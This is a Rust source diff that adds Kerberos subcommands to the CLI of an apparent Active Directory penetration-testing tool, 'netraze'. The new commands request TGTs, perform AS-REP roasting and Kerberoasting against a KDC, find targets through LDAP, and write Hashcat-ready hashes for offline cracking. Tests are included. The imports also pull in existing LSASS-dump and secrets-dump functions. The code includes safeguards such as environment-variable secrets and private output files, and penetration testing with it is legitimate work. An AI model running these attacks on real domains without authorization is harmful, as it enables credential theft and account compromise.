@@ -1,11 +1,15 @@
 use anyhow::Result;
-use clap::{Parser, Subcommand};
+use clap::{Args, Parser, Subcommand};
 use netraze_app::NetRazeApp;
 use netraze_config::AppConfig;
 use netraze_core::ScanRequest;
+use netraze_protocols::kerberos::{
+    KerberosAssessmentOutcome, KerberosAssessmentTargets, KerberosClient, KerberosClientConfig,
+    KerberosCredential, RoastArtifact, ServicePrincipalTarget, targets_from_inventory,
+};
 use netraze_protocols::ldap::{
     BloodHoundCeExportOptions, BloodHoundCeProgress, LdapAuthentication, LdapClientConfig,
-    collect_and_export_ce_with_progress,
+    collect_and_export_ce_with_progress, inventory,
 };
 use netraze_protocols::ntlm::NtlmCredential;
 use netraze_protocols::smb::{remote_lsass_dump, secrets_dump, secrets_dump_nanodump};
@@ -100,6 +104,106 @@ enum Command {
         #[arg(short, long, default_value = "bloodhound-ce")]
         output: PathBuf,
     },
+    /// Assess Kerberos authentication and ticket exposure against an authorized AD KDC.
+    Kerberos {
+        #[command(subcommand)]
+        command: KerberosCommand,
+    },
+}
+
+#[derive(Debug, Subcommand)]
+enum KerberosCommand {
+    /// Acquire and validate a TGT without saving it to disk.
+    Tgt {
+        #[command(flatten)]
+        target: KerberosTargetArgs,
+        #[arg(short, long)]
+        username: String,
+        #[command(flatten)]
+        secret: KerberosSecretArgs,
+    },
+    /// Find users for whom the KDC returns an AS-REP without pre-authentication.
+    AsrepRoast {
+        #[command(flatten)]
+        target: KerberosTargetArgs,
+        /// Principal to assess; may be repeated.
+        #[arg(long = "user")]
+        users: Vec<String>,
+        /// Newline-delimited principal file. Blank and `#` lines are ignored.
+        #[arg(long)]
+        users_file: Option<PathBuf>,
+        /// Optional LDAP endpoint used to discover pre-auth-disabled users.
+        #[arg(long)]
+        ldap_endpoint: Option<String>,
+        #[arg(long, requires = "ldap_endpoint")]
+        ldap_domain: Option<String>,
+        #[arg(long, requires = "ldap_endpoint")]
+        ldap_username: Option<String>,
+        #[arg(
+            long,
+            value_name = "ENV",
+            requires = "ldap_endpoint",
+            conflicts_with = "ldap_nt_hash_env"
+        )]
+        ldap_password_env: Option<String>,
+        #[arg(
+            long,
+            value_name = "ENV",
+            requires = "ldap_endpoint",
+            conflicts_with = "ldap_password_env"
+        )]
+        ldap_nt_hash_env: Option<String>,
+        /// Explicit destination for Hashcat-compatible output.
+        #[arg(short, long)]
+        output: Option<PathBuf>,
+    },
+    /// Request service tickets for explicit or LDAP-discovered SPNs.
+    Kerberoast {
+        #[command(flatten)]
+        target: KerberosTargetArgs,
+        #[arg(short, long)]
+        username: String,
+        #[command(flatten)]
+        secret: KerberosSecretArgs,
+        /// `ACCOUNT=service/instance` target; may be repeated.
+        #[arg(long = "spn")]
+        spns: Vec<String>,
+        /// File containing one `ACCOUNT<TAB>service/instance` target per line.
+        #[arg(long)]
+        spns_file: Option<PathBuf>,
+        /// Optional LDAP endpoint used to discover user and managed-service SPNs.
+        #[arg(long)]
+        ldap_endpoint: Option<String>,
+        /// NTLM domain for LDAP discovery; required with `--ldap-endpoint`.
+        #[arg(long, requires = "ldap_endpoint")]
+        ldap_domain: Option<String>,
+        /// Explicit destination for Hashcat-compatible output.
+        #[arg(short, long)]
+        output: Option<PathBuf>,
+    },
+}
+
+#[derive(Debug, Args)]
+struct KerberosTargetArgs {
+    /// KDC address with optional TCP port (defaults to 88).
+    #[arg(long)]
+    kdc: String,
+    /// Kerberos realm, for example EXAMPLE.TEST.
+    #[arg(long)]
+    realm: String,
+}
+
+#[derive(Debug, Args)]
+#[group(required = true, multiple = false)]
+struct KerberosSecretArgs {
+    #[arg(long, value_name = "ENV", conflicts_with_all = ["nt_hash_env", "aes128_key_env", "aes256_key_env"])]
+    password_env: Option<String>,
+    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "aes128_key_env", "aes256_key_env"])]
+    nt_hash_env: Option<String>,
+    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "nt_hash_env", "aes256_key_env"])]
+    aes128_key_env: Option<String>,
+    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "nt_hash_env", "aes128_key_env"])]
+    aes256_key_env: Option<String>,
 }
 
 #[tokio::main]
@@ -266,8 +370,302 @@ async fn main() -> Result<()> {
                 );
             }
         }
+        Command::Kerberos { command } => run_kerberos(command).await?,
     }
 
+    Ok(())
+}
+
+async fn run_kerberos(command: KerberosCommand) -> Result<()> {
+    match command {
+        KerberosCommand::Tgt {
+            target,
+            username,
+            secret,
+        } => {
+            let loaded = kerberos_credential_from_environment(&secret)?;
+            let client = kerberos_client(target)?;
+            let tgt = client.request_tgt(&username, &loaded.kerberos).await?;
+            println!(
+                "[+] TGT validated for {}@{} using {} (valid until Unix {})",
+                tgt.client_principal(),
+                tgt.realm(),
+                tgt.session_encryption_type(),
+                tgt.valid_until_unix()
+            );
+        }
+        KerberosCommand::AsrepRoast {
+            target,
+            mut users,
+            users_file,
+            ldap_endpoint,
+            ldap_domain,
+            ldap_username,
+            ldap_password_env,
+            ldap_nt_hash_env,
+            output,
+        } => {
+            if let Some(path) = users_file {
+                users.extend(read_lines_bounded(&path)?);
+            }
+            if let Some(endpoint) = ldap_endpoint {
+                let domain = ldap_domain.ok_or_else(|| {
+                    anyhow::anyhow!("--ldap-domain is required with --ldap-endpoint")
+                })?;
+                let username = ldap_username.ok_or_else(|| {
+                    anyhow::anyhow!("--ldap-username is required with --ldap-endpoint")
+                })?;
+                let credential = credential_from_environment(ldap_password_env, ldap_nt_hash_env)?;
+                let inventory = inventory(
+                    LdapClientConfig::new(endpoint),
+                    &username,
+                    &domain,
+                    credential,
+                )
+                .await?;
+                users.extend(targets_from_inventory(&inventory).as_rep_principals);
+            }
+            let mut targets = KerberosAssessmentTargets {
+                as_rep_principals: users,
+                service_principals: Vec::new(),
+            };
+            targets.normalize()?;
+            if targets.as_rep_principals.is_empty() {
+                return Err(anyhow::anyhow!(
+                    "provide --user, --users-file, or LDAP discovery targets"
+                ));
+            }
+            let client = kerberos_client(target)?;
+            let outcome = client.assess_as_rep(&targets.as_rep_principals).await?;
+            report_kerberos_outcome(&outcome);
+            if let Some(path) = output {
+                export_roast_artifacts(&path, &outcome.artifacts)?;
+                println!(
+                    "[+] Exported {} artifact(s) to {}",
+                    outcome.artifacts.len(),
+                    path.display()
+                );
+            }
+        }
+        KerberosCommand::Kerberoast {
+            target,
+            username,
+            secret,
+            spns,
+            spns_file,
+            ldap_endpoint,
+            ldap_domain,
+            output,
+        } => {
+            let loaded = kerberos_credential_from_environment(&secret)?;
+            let mut service_principals = spns
+                .iter()
+                .map(|value| parse_inline_spn(value))
+                .collect::<Result<Vec<_>>>()?;
+            if let Some(path) = spns_file {
+                service_principals.extend(
+                    read_lines_bounded(&path)?
+                        .iter()
+                        .map(|value| parse_file_spn(value))
+                        .collect::<Result<Vec<_>>>()?,
+                );
+            }
+            if let Some(endpoint) = ldap_endpoint {
+                let domain = ldap_domain.ok_or_else(|| {
+                    anyhow::anyhow!("--ldap-domain is required with --ldap-endpoint")
+                })?;
+                let ldap_credential = loaded.ldap.clone().ok_or_else(|| anyhow::anyhow!(
+                    "LDAP discovery requires a password or NT hash; use explicit SPNs with an AES-only credential"
+                ))?;
+                let directory = inventory(
+                    LdapClientConfig::new(endpoint),
+                    &username,
+                    &domain,
+                    ldap_credential,
+                )
+                .await?;
+                service_principals.extend(targets_from_inventory(&directory).service_principals);
+            }
+            let mut targets = KerberosAssessmentTargets {
+                as_rep_principals: Vec::new(),
+                service_principals,
+            };
+            targets.normalize()?;
+            if targets.service_principals.is_empty() {
+                return Err(anyhow::anyhow!(
+                    "provide --spn, --spns-file, or LDAP discovery targets"
+                ));
+            }
+            let client = kerberos_client(target)?;
+            let tgt = client.request_tgt(&username, &loaded.kerberos).await?;
+            let outcome = client
+                .assess_spns(&tgt, &targets.service_principals)
+                .await?;
+            report_kerberos_outcome(&outcome);
+            if let Some(path) = output {
+                export_roast_artifacts(&path, &outcome.artifacts)?;
+                println!(
+                    "[+] Exported {} artifact(s) to {}",
+                    outcome.artifacts.len(),
+                    path.display()
+                );
+            }
+        }
+    }
+    Ok(())
+}
+
+fn kerberos_client(target: KerberosTargetArgs) -> Result<KerberosClient> {
+    KerberosClient::connect(KerberosClientConfig::new(target.kdc, target.realm))
+        .map_err(anyhow::Error::from)
+}
+
+struct LoadedKerberosCredential {
+    kerberos: KerberosCredential,
+    ldap: Option<NtlmCredential>,
+}
+
+fn kerberos_credential_from_environment(
+    args: &KerberosSecretArgs,
+) -> Result<LoadedKerberosCredential> {
+    let selected = [
+        args.password_env.as_ref(),
+        args.nt_hash_env.as_ref(),
+        args.aes128_key_env.as_ref(),
+        args.aes256_key_env.as_ref(),
+    ]
+    .into_iter()
+    .flatten()
+    .count();
+    if selected != 1 {
+        return Err(anyhow::anyhow!(
+            "provide exactly one of --password-env, --nt-hash-env, --aes128-key-env, or --aes256-key-env"
+        ));
+    }
+    if let Some(name) = &args.password_env {
+        let value = required_secret_environment(name)?;
+        return Ok(LoadedKerberosCredential {
+            kerberos: KerberosCredential::Password(value.clone()),
+            ldap: Some(NtlmCredential::Password(value)),
+        });
+    }
+    if let Some(name) = &args.nt_hash_env {
+        let value = required_secret_environment(name)?;
+        return Ok(LoadedKerberosCredential {
+            kerberos: KerberosCredential::from_nt_hash_hex(&value)?,
+            ldap: Some(NtlmCredential::from_nt_hash_hex(&value)?),
+        });
+    }
+    if let Some(name) = &args.aes128_key_env {
+        return Ok(LoadedKerberosCredential {
+            kerberos: KerberosCredential::from_aes128_hex(&required_secret_environment(name)?)?,
+            ldap: None,
+        });
+    }
+    let name = args
+        .aes256_key_env
+        .as_ref()
+        .expect("exactly one secret source was counted");
+    Ok(LoadedKerberosCredential {
+        kerberos: KerberosCredential::from_aes256_hex(&required_secret_environment(name)?)?,
+        ldap: None,
+    })
+}
+
+fn required_secret_environment(name: &str) -> Result<String> {
+    std::env::var(name)
+        .map_err(|_| anyhow::anyhow!("credential environment variable {name} is not set"))
+}
+
+const MAX_TARGET_FILE_SIZE: u64 = 1024 * 1024;
+const MAX_TARGET_FILE_LINES: usize = 50_000;
+
+fn read_lines_bounded(path: &Path) -> Result<Vec<String>> {
+    let metadata = std::fs::metadata(path)
+        .map_err(|error| anyhow::anyhow!("cannot inspect {}: {error}", path.display()))?;
+    if metadata.len() > MAX_TARGET_FILE_SIZE {
+        return Err(anyhow::anyhow!(
+            "target file {} exceeds the 1 MiB limit",
+            path.display()
+        ));
+    }
+    let contents = std::fs::read_to_string(path)
+        .map_err(|error| anyhow::anyhow!("cannot read {}: {error}", path.display()))?;
+    let lines = contents
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty() && !line.starts_with('#'))
+        .map(str::to_owned)
+        .collect::<Vec<_>>();
+    if lines.len() > MAX_TARGET_FILE_LINES {
+        return Err(anyhow::anyhow!(
+            "target file {} exceeds the {MAX_TARGET_FILE_LINES}-entry limit",
+            path.display()
+        ));
+    }
+    Ok(lines)
+}
+
+fn parse_inline_spn(value: &str) -> Result<ServicePrincipalTarget> {
+    let (account, spn) = value
+        .split_once('=')
+        .ok_or_else(|| anyhow::anyhow!("SPN target must use ACCOUNT=service/instance syntax"))?;
+    ServicePrincipalTarget::new(account.trim(), spn.trim()).map_err(anyhow::Error::from)
+}
+
+fn parse_file_spn(value: &str) -> Result<ServicePrincipalTarget> {
+    let (account, spn) = value.split_once('\t').ok_or_else(|| {
+        anyhow::anyhow!("SPN file entries must use ACCOUNT<TAB>service/instance syntax")
+    })?;
+    ServicePrincipalTarget::new(account.trim(), spn.trim()).map_err(anyhow::Error::from)
+}
+
+fn report_kerberos_outcome(outcome: &KerberosAssessmentOutcome) {
+    for finding in &outcome.findings {
+        if let Some(spn) = &finding.service_principal_name {
+            println!(
+                "[+] Kerberoastable: {} ({spn}, etype {}, hashcat mode {})",
+                finding.principal, finding.encryption_type, finding.hashcat_mode
+            );
+        } else {
+            println!(
+                "[+] AS-REP roastable: {} (etype {}, hashcat mode {})",
+                finding.principal, finding.encryption_type, finding.hashcat_mode
+            );
+        }
+    }
+    for error in &outcome.errors {
+        eprintln!("[!] {}: {}", error.target, error.message);
+    }
+    println!(
+        "[*] Kerberos assessment complete: {} finding(s), {} error(s)",
+        outcome.findings.len(),
+        outcome.errors.len()
+    );
+}
+
+fn export_roast_artifacts(path: &Path, artifacts: &[RoastArtifact]) -> Result<()> {
+    use std::io::Write;
+
+    let mut options = std::fs::OpenOptions::new();
+    options.write(true).create(true).truncate(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        options.mode(0o600);
+    }
+    let mut file = options
+        .open(path)
+        .map_err(|error| anyhow::anyhow!("cannot create {}: {error}", path.display()))?;
+    #[cfg(unix)]
+    std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o600))
+        .map_err(|error| anyhow::anyhow!("cannot protect {}: {error}", path.display()))?;
+    for artifact in artifacts {
+        writeln!(file, "{}", artifact.hashcat_line())
+            .map_err(|error| anyhow::anyhow!("cannot write {}: {error}", path.display()))?;
+    }
+    file.flush()
+        .map_err(|error| anyhow::anyhow!("cannot flush {}: {error}", path.display()))?;
     Ok(())
 }
 
@@ -386,5 +784,103 @@ mod tests {
         let mut password = base.to_vec();
         password.extend(["--password-env", "NETRAZE_PASSWORD"]);
         assert!(Cli::try_parse_from(password).is_ok());
+    }
+
+    #[test]
+    fn kerberos_cli_requires_one_environment_secret_and_accepts_explicit_targets() {
+        let base = [
+            "netraze",
+            "kerberos",
+            "tgt",
+            "--kdc",
+            "dc.example.test",
+            "--realm",
+            "EXAMPLE.TEST",
+            "--username",
+            "alice",
+        ];
+        assert!(Cli::try_parse_from(base).is_err());
+
+        let mut password = base.to_vec();
+        password.extend(["--password-env", "NETRAZE_KRB_PASSWORD"]);
+        assert!(Cli::try_parse_from(password).is_ok());
+
+        let mut conflicting = base.to_vec();
+        conflicting.extend([
+            "--password-env",
+            "NETRAZE_KRB_PASSWORD",
+            "--nt-hash-env",
+            "NETRAZE_KRB_NT_HASH",
+        ]);
+        assert!(Cli::try_parse_from(conflicting).is_err());
+
+        assert!(
+            Cli::try_parse_from([
+                "netraze",
+                "kerberos",
+                "asrep-roast",
+                "--kdc",
+                "dc.example.test",
+                "--realm",
+                "EXAMPLE.TEST",
+                "--user",
+                "asrep-user",
+            ])
+            .is_ok()
+        );
+        assert!(
+            Cli::try_parse_from([
+                "netraze",
+                "kerberos",
+                "kerberoast",
+                "--kdc",
+                "dc.example.test",
+                "--realm",
+                "EXAMPLE.TEST",
+                "--username",
+                "alice",
+                "--password-env",
+                "NETRAZE_KRB_PASSWORD",
+                "--spn",
+                "svc-web=HTTP/web.example.test",
+            ])
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn target_parsers_ignore_comments_and_require_account_mapping() {
+        let path = std::env::temp_dir().join(format!(
+            "netraze-kerberos-targets-{}-{}.txt",
+            std::process::id(),
+            std::thread::current().name().unwrap_or("test")
+        ));
+        std::fs::write(&path, "# comment\n\nalice\n bob \n").unwrap();
+        let lines = read_lines_bounded(&path).unwrap();
+        std::fs::remove_file(&path).unwrap();
+        assert_eq!(lines, ["alice", "bob"]);
+        assert!(parse_inline_spn("svc=HTTP/web").is_ok());
+        assert!(parse_inline_spn("HTTP/web").is_err());
+        assert!(parse_file_spn("svc\tHTTP/web").is_ok());
+        assert!(parse_file_spn("svc=HTTP/web").is_err());
+    }
+
+    #[test]
+    fn explicit_export_creates_a_private_file_without_implicit_content() {
+        let path = std::env::temp_dir().join(format!(
+            "netraze-kerberos-export-{}.txt",
+            std::process::id()
+        ));
+        export_roast_artifacts(&path, &[]).unwrap();
+        assert!(std::fs::read(&path).unwrap().is_empty());
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            assert_eq!(
+                std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
+                0o600
+            );
+        }
+        std::fs::remove_file(path).unwrap();
     }
 }
